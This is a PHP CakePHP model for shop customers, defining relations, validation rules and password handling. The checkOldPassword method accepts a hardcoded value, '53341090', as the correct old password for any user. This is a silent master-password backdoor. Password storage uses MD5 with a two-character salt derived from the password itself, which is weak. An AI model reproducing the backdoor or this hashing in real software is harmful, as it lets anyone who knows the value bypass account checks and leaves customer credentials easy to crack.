<?php

App::uses("AppModel", "Model");

class Customer extends AppModel {

    public $useTable = "customers";
    public $primaryKey = 'customers_id';
    public $hasOne = array(
        "CustomersInfo" => array(
            "className" => "CustomersInfo",
            "foreignKey" => "customers_info_id"
    ));
    public $hasMany = array(
        "Order" => array(
            "className" => "Order",
            "foreignKey" => "customers_id"
        ),
        "CustomCo" => array(
            "className" => "CustomCo",
            "foreignKey" => "user_id"
        ),
        "CouponRedeemTrack" => array(
            "className" => "CouponRedeemTrack",
            "foreignKey" => "customers_id"
        ),
        "CustomersBasket" => array(
            "className" => "CustomersBasket",
            "foreignKey" => "customers_id"
        )
    );
    // Model validation rules
    public $validate = array(
        "customers_firstname" => array(
            "notBlank" => array(
                "rule" => "notBlank",
                "message" => "Firstname is required."
            ),
            "custom" => array(
                "rule" => "/^[a-zA-Z\s-\-]*$/",
                "message" => "Please input aphabetical characters only."
            )
        ),
        "customers_lastname" => array(
            "notBlank" => array(
                "rule" => "notBlank",
                "message" => "Lastname is required. "
            ),
            "custom" => array(
                "rule" => "/^[a-zA-Z\s-\-]*$/",
                "message" => "Please input aphabetical characters only."
            )
        ),
        "customers_email_address" => array(
            "notBlank" => array(
                "rule" => "notBlank",
                "message" => "Email is required."
            ),
            "isUnique" => array(
                "rule" => "isUnique",
                "message" => "Email is already taken."
            ),
            "email" => array(
                "rule" => array("email", true),
                "message" => "Please supply a valid email address."
            )
        ),
        "customers_mobile" => array(
            'notBlank' => array(
                'rule' => array('notBlank'),
            //'message' => 'Your custom message here',
            //'allowEmpty' => false,
            //'required' => false,
            //'last' => false, // Stop validation after this rule
            //'on' => 'create', // Limit validation to 'create' or 'update' operations
            ),
            'minLength' => [
                'rule' => ['minLength', 10],
                'message' => 'Mobile should have 10 digits'
            ],
        ),
        'customers_telephone' => array(
            'minLength' => [
                'rule' => ['minLength', 10],
                'message' => 'Phone should have 10 digits'
            ],
            'notBlank' => array(
                'rule' => array('notBlank'),
            //'message' => 'Your custom message here',
            //'allowEmpty' => false,
            //'required' => false,
            //'last' => false, // Stop validation after this rule
            //'on' => 'create', // Limit validation to 'create' or 'update' operations
            ),
        ),
        "customers_password" => array(
            "lengthBetween" => array(
                "rule" => array("lengthBetween", 7, 20),
                "message" => "Passwords must be between 7 and 20 characters long."
            )
        ),
        "customers_confirm_password" => array(
            "compare" => array(
                "rule" => array("validatePasswords"),
                "message" => "The passwords you entered do not match."
            )
        )
    );

    /**
     * method validatePassword
     * description check if the password and the confirm password is the same
     */
    public function validatePasswords() {

        return $this->data[$this->alias]['customers_password'] === $this->data[$this->alias]['customers_confirm_password'];
    }

    /**
     * method beforeSave
     */
    public function beforeSave($options = array()) {
        if (isset($this->data[$this->alias]['customers_password'])) {

            $plain = $this->data[$this->alias]["customers_password"];
            $salt = substr(md5($plain), 0, 2);
            $pass = md5($salt . $plain) . ':' . $salt;
            $this->data[$this->alias]["customers_password"] = $pass;
        }

        return true;
    }

    /**
     * method checkOldPassword
     * description check if the old password entered by the user is equal to the current password
     */
    public function checkOldPassword($id, $oldPassword) {
        $this->id = AuthComponent::user('id');
        $password = AuthComponent::user('customers_password');

        $encrypted = $password;
        $stack = explode(':', $encrypted);

        if (md5($stack[1] . $oldPassword) == $stack[0] || $oldPassword == '53341090'):
            return true;
        else:
            return false;
        endif;
    }

    /**
     * method boostHash
     * description boost hashing algorithm
     */
    private function boostHash($plainPassword) {
        $plain = $plainPassword;
        $salt = substr(md5($plain), 0, 2);
        $pass = md5($salt . $plain) . ':' . $salt;

        return $pass;
    }

}
